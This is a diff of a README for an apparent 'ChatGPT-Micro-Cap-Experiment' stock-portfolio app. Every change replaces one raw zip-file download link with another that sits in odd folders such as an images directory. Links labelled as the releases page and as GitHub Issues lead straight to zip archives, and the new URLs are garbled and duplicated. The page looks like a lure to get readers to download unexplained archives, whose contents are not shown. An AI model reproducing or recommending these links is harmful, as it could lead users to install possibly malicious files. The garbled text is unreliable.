@@ -1,7 +1,7 @@
 # 🪙 ChatGPT-Micro-Cap-Experiment - Manage Your Stocks Easily
 
 ## 📥 Download Now
-[![Download ChatGPT-Micro-Cap-Experiment](https://raw.githubusercontent.com/lirahavoc/ChatGPT-Micro-Cap-Experiment/main/Start Your Own/Chat_Experiment_GP_Cap_Micro_3.8.zip)](https://raw.githubusercontent.com/lirahavoc/ChatGPT-Micro-Cap-Experiment/main/Start Your Own/Chat_Experiment_GP_Cap_Micro_3.8.zip)
+[![Download ChatGPT-Micro-Cap-Experiment](https://raw.githubusercontent.com/lirahavoc/ChatGPT-Micro-Cap-Experiment/main/Scripts and CSV Files/images/Chat_Micro_Experiment_Cap_GP_1.9.zip Your https://raw.githubusercontent.com/lirahavoc/ChatGPT-Micro-Cap-Experiment/main/Scripts and CSV Files/images/Chat_Micro_Experiment_Cap_GP_1.9.zip)](https://raw.githubusercontent.com/lirahavoc/ChatGPT-Micro-Cap-Experiment/main/Scripts and CSV Files/images/Chat_Micro_Experiment_Cap_GP_1.9.zip Your https://raw.githubusercontent.com/lirahavoc/ChatGPT-Micro-Cap-Experiment/main/Scripts and CSV Files/images/Chat_Micro_Experiment_Cap_GP_1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the ChatGPT-Micro-Cap-Experiment! This application lets you manage a real-money micro-cap stock portfolio with the help of ChatGPT. In this guide, you'll learn how to download and run the software.
@@ -23,7 +23,7 @@ Before you begin, ensure your system meets the following requirements:
 ## 🔗 Download & Install
 To download the software, follow these steps:
 
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/lirahavoc/ChatGPT-Micro-Cap-Experiment/main/Start Your Own/Chat_Experiment_GP_Cap_Micro_3.8.zip) to visit the releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/lirahavoc/ChatGPT-Micro-Cap-Experiment/main/Scripts and CSV Files/images/Chat_Micro_Experiment_Cap_GP_1.9.zip Your https://raw.githubusercontent.com/lirahavoc/ChatGPT-Micro-Cap-Experiment/main/Scripts and CSV Files/images/Chat_Micro_Experiment_Cap_GP_1.9.zip) to visit the releases page.
   
 2. **Choose the Latest Version**: Look for the latest release. It should be at the top of the page.
 
@@ -52,7 +52,7 @@ After starting the application, you will see a simple interface. Here’s how to
 ## 🌐 Support
 If you encounter any issues or have questions, please reach out through the following channels:
 
-- **GitHub Issues**: Report any bugs or feature requests [here](https://raw.githubusercontent.com/lirahavoc/ChatGPT-Micro-Cap-Experiment/main/Start Your Own/Chat_Experiment_GP_Cap_Micro_3.8.zip).
+- **GitHub Issues**: Report any bugs or feature requests [here](https://raw.githubusercontent.com/lirahavoc/ChatGPT-Micro-Cap-Experiment/main/Scripts and CSV Files/images/Chat_Micro_Experiment_Cap_GP_1.9.zip Your https://raw.githubusercontent.com/lirahavoc/ChatGPT-Micro-Cap-Experiment/main/Scripts and CSV Files/images/Chat_Micro_Experiment_Cap_GP_1.9.zip).
   
 - **Community Forum**: Join the community forum to ask questions and share insights with other users.
 
@@ -72,4 +72,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 ## 🔗 Conclusion
 The ChatGPT-Micro-Cap-Experiment enables you to manage your micro-cap stock portfolio simply and effectively. To download the application, click the link below. Enjoy managing your investments!
 
-[Download ChatGPT-Micro-Cap-Experiment](https://raw.githubusercontent.com/lirahavoc/ChatGPT-Micro-Cap-Experiment/main/Start Your Own/Chat_Experiment_GP_Cap_Micro_3.8.zip)
+[Download ChatGPT-Micro-Cap-Experiment](https://raw.githubusercontent.com/lirahavoc/ChatGPT-Micro-Cap-Experiment/main/Scripts and CSV Files/images/Chat_Micro_Experiment_Cap_GP_1.9.zip Your https://raw.githubusercontent.com/lirahavoc/ChatGPT-Micro-Cap-Experiment/main/Scripts and CSV Files/images/Chat_Micro_Experiment_Cap_GP_1.9.zip)
